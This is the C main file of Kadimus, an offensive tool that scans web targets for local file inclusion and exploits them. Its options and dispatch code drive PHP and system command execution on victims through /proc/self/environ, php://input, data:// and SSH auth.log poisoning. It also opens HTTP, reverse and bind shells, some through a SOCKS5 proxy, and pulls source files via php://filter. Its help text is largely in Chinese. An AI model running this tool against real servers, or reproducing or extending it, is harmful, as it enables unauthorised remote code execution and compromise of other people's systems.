// Coded by MMxM (@hc0d3r)
// P0cl4bs Team: Mh4x0f, N4sss , Kwrnel, MovCode, joridos, Brenords
// Greetz to:
// Cyclone, xstpl, rafiki, Dennis, susp3it0virtual, kodo no kami, chuck kill, Wulf
// janissaries team

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <getopt.h>
#include <sys/types.h>
#include <sys/wait.h>

#include "kadimus_common.h"
#include "kadimus_str.h"
#include "kadimus_mem.h"
#include "kadimus_request.h"
#include "kadimus_xpl.h"
#include "kadimus_regex.h"
#include "kadimus_socket.h"
#include "kadimus_io.h"

#include "kadimus.h"

static xpl_parameters xpl;

static struct all_opts options;

static struct option long_options[] = {
	{"help", no_argument, 0, 'h'}, // ok
	{"cookie", required_argument, 0, 'B'}, //ok
	{"user-agent", required_argument, 0, 'A'}, //ok
	{"connect-timeout", required_argument, 0, 0}, //ok
	{"url", required_argument, 0, 'u'}, // fazer chegagem
	{"url-list", required_argument, 0, 'U'}, //ok
	{"target", required_argument, 0, 't'}, //ok
	{"rce-technique", required_argument, 0, 'X'}, //ok
	{"code", required_argument, 0, 'C'}, //ok

	{"cmd", required_argument, 0, 'c'}, //ok
	{"shell", no_argument, 0, 's'}, //ok

	{"reverse-shell", no_argument, 0, 'r'}, //ok
	{"listen", required_argument, 0, 'l'},

	{"bind-shell", no_argument, 0, 'b'}, //ok

	{"connect-to", required_argument, 0, 'i'}, //ok
	{"port", required_argument, 0, 'p'}, //ok
	//ok
	{"ssh-port", required_argument, 0, 0}, //ok
	{"ssh-target", required_argument, 0, 0},
	{"retry-times", required_argument, 0, 0}, //ok

	{"get-source", no_argument, 0, 'G'}, //ok
	{"filename", required_argument, 0, 'f'}, //ok
	{"output", required_argument, 0, 'o'}, // quase_ok

	{"threads", required_argument, 0, 0},
	{"inject-at", required_argument, 0, 0},

	{"proxy", required_argument, 0, 0},
	{"b-proxy", required_argument, 0, 0},
	{"b-port", required_argument, 0, 0},

	{0, 0, 0, 0}
};


void parser_opts(int argc, char **argv){

	char *opt_ptr=NULL;
	int Getopts, option_index = 0;
	int tmp;

	timeout = 10;
	retry_times = 5;

	while( (Getopts = getopt_long(argc, argv, OPTS, long_options, &option_index)) != -1){
		opt_ptr = (char *) long_options[option_index].name;
		switch(Getopts){

			case 0:
				if(!strcmp(opt_ptr, "connect-timeout")){
					tmp = (int) strtol(optarg, NULL, 10);
					if( !IN_RANGE(tmp, 5, 120) )
						die("--connect-timeout error: please set a value between 5 and 120 seconds",0);
					else
						timeout = (size_t) tmp;
				}

				else if(!strcmp(opt_ptr, "ssh-port")){
					tmp = (int) strtol(optarg, NULL, 10);
					if( !IN_RANGE(tmp, 1, 65535) )
						die("--ssh-port 错误: 请设置一个有效的端口 (1 .. 65535)",0);
					else
						xpl.ssh_port = (size_t) tmp;
				}

				else if(!strcmp(opt_ptr, "ssh-target")){
					if( valid_ip_hostname(optarg) )
						xpl.ssh_host = optarg;
					else
						die("--ssh-target 错误:无效的IP/主机名",0);
				}

				else if(!strcmp(opt_ptr, "retry-times")){
					tmp = (int) strtol(optarg, NULL, 10);
					if( !IN_RANGE(tmp, 0, 10) )
						die("--retry-times 错误:值必须介于0和10之间",0);
					else
						retry_times = (size_t) tmp;
				}

				else if(!strcmp(opt_ptr, "threads")){
					tmp = (int) strtol(optarg, NULL, 10);
					if( !IN_RANGE(tmp, 2, 1000) )
						die("--threads error: set a valide value (2..1000)",0);
					else
						options.threads = (size_t) tmp;
				}

				else if(!strcmp(opt_ptr, "inject-at")){
					xpl.p_name = optarg;
				}

				else if(!strcmp(opt_ptr, "proxy")){
					if( regex_match(PROXY_REGEX, optarg, 0, 0) )
						proxy = optarg;
					else
						die("--proxy invalid syntax", 0);
				}

				else if(!strcmp(opt_ptr, "b-proxy")){
					options.b_proxy = optarg;
				}

				else if(!strcmp(opt_ptr, "b-port")){
					tmp = (int) strtol(optarg, NULL, 10);
					if( !IN_RANGE(tmp, 1, 65535) )
						die("--r-port error: set a valide port (1 .. 65535)",0);
					else
						options.b_port = tmp;
				}

			break;

			case 'h':
				help();
			break;

			case 'B':
				cookies = optarg;
			break;

			case 'A':
				UA = optarg;
			break;

			case 'u':
				if( regex_match(URL_REGEX, optarg, 0, 0) )
					options.url = optarg;
				else
					die("-u, --url URL Have invalid syntax",0);
			break;

			case 'U':
				options.url_list = xfopen(optarg,"r");
			break;

			case 't':
				xpl.vuln_uri = optarg;
			break;

			case 'X':
				if(!strcmp("environ",optarg))
					xpl.tech = ENVIRON;
				else if(!strcmp("auth",optarg))
					xpl.tech = AUTH;
				else if (!strcmp("input",optarg))
					xpl.tech = INPUT;
				else if (!strcmp("data", optarg))
					xpl.tech = DATA;
				else
					die("-X, --rce-technique Invalid RCE technique",0);
			break;

			case 'C':
				if( regex_match("^\\s*?\\<\\?.+\\?\\>\\s*?$",optarg,0,PCRE_DOTALL) )
					xpl.code = optarg;
				else
					die("-C, --code 参数必须包含php括号<?php ?>",0);
			break;

			case 'c':
				xpl.cmd = optarg;
			break;

			case 's':
				options.shell = true;
			break;

			case 'r':
				options.reverse_shell = true;
			break;

			case 'b':
				options.bind_shell = true;
			break;

			case 'i':
				if( valid_ip_hostname(optarg) )
					options.ip_addr = optarg;
				else
					die("-i, --connect-to error: Invalid IP/Hostname",0);
			break;

			case 'p':
				tmp = (int) strtol(optarg, NULL, 10);
				if( !IN_RANGE(tmp, 1, 65535) )
					die("-p, --port error: set a valide port (1 .. 65535)",0);
				else
					options.port = (size_t) tmp;
			break;

			case 'G':
				options.get_source = true;
			break;

			case 'f':
				options.filename = optarg;
			break;

			case 'o':
				output = xfopen(optarg,"a");
				setlinebuf(output);
			break;

			case 'O':
				options.source_output = xfopen(optarg,"a");
			break;

			case 'l':
				tmp = (int) strtol(optarg, NULL, 10);

				if( !IN_RANGE(tmp, 1, 65535) )
					die("-l, --listen error: set a valide port (1 .. 65535)",0);
				else
					options.listen = (size_t) tmp;
			break;

			default:
				abort();

		}

	}

	if(options.reverse_shell && options.bind_shell)
		die("error: reverse connection & bind connection are enabled",0);

	if(options.reverse_shell && !options.listen)
		die("error: -r,reverse-shell required -l, --listen option",0);

	if(options.threads && !options.url_list)
		die("error: --threads required -U, --url-list option",0);

	if(!xpl.p_name && xpl.tech == DATA)
		die("error: RCE data type required --inject-at option",0);

	if(!options.url && !options.url_list && !xpl.vuln_uri)
		die("kadimus: try 'kadimus -h' or 'kadimus --help' for display help",0);

}

void banner(void){
	printf(" _  __         _ _                     \n");
	printf("| |/ /__ _  __| (_)_ __ ___  _   _ ___ \n");
	printf("| ' // _` |/ _` | | '_ ` _ \\| | | / __|\n");
	printf("| . \\ (_| | (_| | | | | | | | |_| \\__ \\\n");
	printf("|_|\\_\\__,_|\\__,_|_|_| |_| |_|\\__,_|___/\n");
	printf("\n");
	printf("  v%s - 本地文件包含/扫描和利用工具 (@hc0d3r - P0cL4bs Team)\n\n",VERSION);
}

void help(void){
	printf("参数:\n\
  -h, --help                    显示帮助菜单\n\
\n\
  请求:\n\
    -B, --cookie 字符串         设置自定义HTTP Cookie\n\
    -A, --user-agent 字符串     发送到服务器的User-Agent\n\
    --connect-timeout 秒        设置连接超时的时间\n\
    --retry-times 数字          连接失败时重试的次数\n\
    --proxy 字符串              代理连接，语法: 协议http(s)://代理地址:端口\n\
\n\
  扫描:\n\
    -u, --url 字符串            要扫描的单个URI\n\
    -U, --url-list 文件         从文件中批量扫描URI\n\
    -o, --output 文件           保存输出结果到一个文件中\n\
    --threads 数字              线程数 (2..1000)\n\
\n\
  开发:\n\
    -t, --target 字符串         目标\n\
    --injec-at 字符串           指定注入payload的参数名称\n\
                                (只需要远程执行代码数据和source disclosure)\n\
\n\
  RCE(Remote Code Execution)远程执行代码漏洞:\n\
    -X, --rce-technique=TECH    使用LFI本地文件包含执行RCE技术\n\
    -C, --code 字符串           执行自定义PHP代码,用PHP括号<?php ?>\n\
    -c, --cmd 字符串            在易受攻击的目标系统上执行系统命令\n\
    -s, --shell                 通过HTTP请求建立一个简单的shell命令界面\n\
\n\
    -r, --reverse-shell         尝试建立一个反向shell连接\n\
    -l, --listen 数字           监听端口号\n\
\n\
    -b, --bind-shell            尝试连接到bind-shell\n\
    -i, --connect-to 字符串     建立连接的Ip或者主机名\n\
    -p, --port 数字             连接端口\n\
    --b-proxy 字符串            建立Socks5 代理的IP或者主机名\n\
    --b-port 数字               Socks5代理端口号\n\
\n\
    --ssh-port 数字             设置SSH端口尝试注入命令(默认端口: 22)\n\
    --ssh-target 字符串         设置SSH主机\n\
\n\
    RCE可利用的技术(配合-X 选项，后面紧跟下列选项)\n\
\n\
      environ                   尝试使用/proc/self/environ运行PHP代码\n\
      input                     尝试使用php://input运行PHP代码 \n\
      auth                      尝试使用/var/log/auth.log运行PHP代码\n\
      data                      尝试使用data://text文本运行PHP代码\n\
\n\
    源代码泄露检测:\n\
      -G, --get-source          尝试使用filter://获取源文件 \n\
      -f, --filename 字符串     指定文件名来抓取源文件 [必填]\n\
      -O 文件                   设置输出文件 (默认: stdout)\n\
\n");
exit(0);
}

int main(int argc, char **argv){

	size_t max_len = 0, thread_count = 0, i = 0;
	pthread_t *thrs = NULL;
	char *line = NULL;
	pid_t bg_listen = 0;

	banner();
	parser_opts(argc, argv);

	curl_global_init(CURL_GLOBAL_ALL);
	srand(time(NULL));

	if(options.url){
		scan(options.url);
	}

	if(options.threads){
		if( (thrs = calloc(options.threads, sizeof(pthread_t)) ) == NULL)
			die("calloc() error",1);

		init_locks();
		thread_on = true;

	} else {
		thread_on = false;
	}

	if(options.url_list){
		max_len = get_max_len(options.url_list);
		line = xmalloc( max_len+1 );

		while( readline(options.url_list, line, max_len) ){
			if( regex_match(URL_REGEX, line, 0, 0) ) {
				if(!options.threads){
					scan(line);
				} else {
					pthread_create(&thrs[thread_count], 0, thread_scan, (void *) xstrdup(line));
					thread_count++;

					if(thread_count == options.threads){

						for(i=0; i < options.threads; i++){
							pthread_join(thrs[i], NULL);
							thrs[i] = 0;
						}

						thread_count = 0;
					}

				}
			}
		}

		xfree(line);
		fclose(options.url_list);
	}

	if(options.threads){

		for(i=0; i<options.threads; i++){
			if(thrs[i] == 0)
				continue;
			else
				pthread_join(thrs[i], NULL);
		}

		xfree(thrs);
		kill_locks();
	}

	if(options.url_list){
		printf("\n[~] 扫描完成 !!!\n\n");
	}

	if(options.get_source && xpl.vuln_uri && options.filename && xpl.p_name){
		source_disclosure_get(xpl.vuln_uri, options.filename, xpl.p_name, options.source_output);
	}

	if(xpl.tech==AUTH){
		printf("[*] Checking /var/log/auth.log poison ...\n");
		if( check_auth_poison(xpl.vuln_uri) ){
			printf("[+] Ok\n\n");
		} else {
			printf("[-] error, try inject in log file ...\n");

			if( ssh_log_poison(xpl.ssh_host, xpl.ssh_port) ){

				printf("[+] Log injection OK, checking file ...\n");

				if( check_auth_poison(xpl.vuln_uri) ){
					printf("[+] Injection Sucessfull\n\n");
				} else {
					printf("[-] error\n\n");
					exit(1);
				}
			}

			else {
				printf("[-] error\n\n");
			}


		}

	}

	if(xpl.vuln_uri && options.shell && xpl.tech){
		rce_http_shell(xpl.vuln_uri, xpl.tech, xpl.p_name);
	}

	if(options.reverse_shell){
		bg_listen = fork();

		if(bg_listen == 0){
			reverse_shell(options.listen);
			return 0;
		}

		else if(bg_listen < 0){
			die("fork() error",1);
		}

		sleep(1);
	}

	if(xpl.code && xpl.vuln_uri && xpl.tech){
		xpl.cmdx = false;
		exec_php(xpl);
	}

	if(xpl.cmd && xpl.vuln_uri && xpl.tech){
		xpl.cmdx = true;
		exec_php(xpl);
	}

	if(options.bind_shell && options.ip_addr && options.port){
		bind_shell(options.ip_addr, options.port, options.b_proxy, options.b_port);
	}

	if(options.reverse_shell){
		waitpid(bg_listen, NULL, 0);
	}

	if(output)
		fclose(output);

	curl_global_cleanup();


	return 0;


}
